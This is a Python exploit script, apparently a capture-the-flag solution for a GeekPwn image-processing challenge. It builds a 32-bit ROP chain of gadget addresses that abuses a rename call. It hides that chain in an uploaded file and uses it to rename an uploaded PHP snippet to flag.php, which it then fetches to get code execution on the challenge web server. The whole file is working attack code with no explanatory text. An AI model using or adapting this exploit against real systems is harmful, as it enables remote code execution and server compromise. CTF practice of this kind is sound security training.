from pwn import *
import requests
import urllib

payload=''
payload+='/var/www/html/upload/14747705722.em'
payload+='\x90'*4
payload+='/var/www/html/upload/flag.php'
payload=payload.ljust(120,'\x90')

#0x0804847e : pop ebx ; pop esi ; pop edi ; ret
payload+=p32(0x0804847e)

#0x080b88b6 : pop eax ; ret  1 
payload+=p32(0x080b88b6)

#0x080ad664 : pop ebx ; pop ebp ; pop esi ; pop edi ; ret
#0x080a046c : pop ebx ; pop edi ; ret
#0x0804847e : pop ebx ; pop esi ; pop edi ; ret
payload+=p32(0x0804847e)

#mprotect=0x806E660
#0x080b68f2 : push esp ; add esp, 8 ; pop ebx ; ret 2
payload+=p32(0x080b68f2)

#0x080a990c : xchg eax, edi ; ret
payload+=p32(0x080a990c)
payload+=p32(0x41414141)
# 0x080483ca : pop ebp ; ret
payload+=p32(0x080483ca)
payload+=p32(0x41414141)
#0x080b25df : sub esp, 0x24 ; mov dword ptr [esp + 0x14], eax ; push ecx ; push edx ; call eax
payload+=p32(0x080b25df)

# # 0x0806f59a : pop edx ; ret
payload+=p32(0x0806f59a)
payload+=p32(0xffffffa0-0x28+65-8+3)
#0x08069663 : add eax, edx ; ret
payload+=p32(0x08069663)
#0x0805463c : mov dword ptr [eax + 8], 0 ; ret
payload+=p32(0x0805463c)

# # 0x0806f59a : pop edx ; ret
payload+=p32(0x0806f59a)
payload+=p32(0xffffffff- 28+8)
#0x08069663 : add eax, edx ; ret
payload+=p32(0x08069663)


# 0x0804831e : xchg eax, edx ; ret
# 0x08065dd4 : mov eax, edx ; ret
payload+=p32(0x0804831e)
payload+=p32(0x08065dd4)
#0x0805ccff : mov esi, edx ; ret
payload+=p32(0x0805ccff)



# # 0x0806f59a : pop edx ; ret
payload+=p32(0x0806f59a)
payload+=p32(0xffffffff- 8-3)
#0x08069663 : add eax, edx ; ret
payload+=p32(0x08069663)

payload+=p32(0x0805463c)

payload+=p32(0x0806f59a)
payload+=p32(0xffffffff-35+9)
#0x08069663 : add eax, edx ; ret
payload+=p32(0x08069663)


#0x80a990c : xchg eax, edi ; ret
payload+=p32(0x80a990c)

#0x0805314a : xchg eax, esi ; ret

payload+=p32(0x0805314a)

# 0x0804831e : xchg eax, edx ; ret

payload+=p32(0x0804831e)

#0x80a990c : xchg eax, edi ; ret
payload+=p32(0x80a990c)

#0x080a046c : pop ebx ; pop edi ; ret
payload+=p32(0x080a046c)
payload+=p32(0x804F180) # int __usercall rename_804F180@<eax>
payload+=p32(0x804F180) # int __usercall rename_804F180@<eax>

## 0x0809fb13 : push esi ; push edx ; push eax ; call ebx
payload+=p32(0x0809fb13)


payload=payload.ljust(300,'\x90')

template='''
P3TSCTF{111}
10 10
1113
'''

template2='''
P3TSCTF{111}
2 3
1113
'''

payload2=r'<php? phpinfo();?>'

def gepayload(payload,template):
	r=''
	for i in range(len(payload)):
		r+=str(ord(payload[i]))
		if i%3==2:
			r+='\n'
		else:
			r+=' '
	open('test1','wb').write(template+r)
	return template+r




up = '''
------WebKitFormBoundary7jvi3sJCWswIWewA
Content-Disposition: form-data; name="userfile"; filename="test1.txt"
Content-Type: text/plain
%s
------WebKitFormBoundary7jvi3sJCWswIWewA--
'''

def get_file(path):
    url ='http://emage.geekpwn.org/loadfile1.php?pic=%s' % path
    print url
    r = requests.get(url).content

    return r

def upload_file(s):
    url ='http://emage.geekpwn.org/upload.php'
    data = up % s
    header = {'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundary7jvi3sJCWswIWewA'}
    r = requests.post(url,data=data, timeout=5,headers=header,allow_redirects=False)

    return r.headers['Location'].split('#')[1].strip()

def main():

    up=gepayload(payload2,template2)
    path = upload_file(up)
    print 'generate /var/www/html/upload/%s' % path
    payload1=payload.replace('14747705722.em',path)
    up=gepayload(payload1,template)

    upload_file(up)

    print 'rename %s to flag.php' % path

    print "flag:  http://emage.geekpwn.org/upload/flag.php "
    f=urllib.urlopen("http://emage.geekpwn.org/upload/flag.php")
    s=f.read()
    print s

if __name__ == "__main__":
    main()
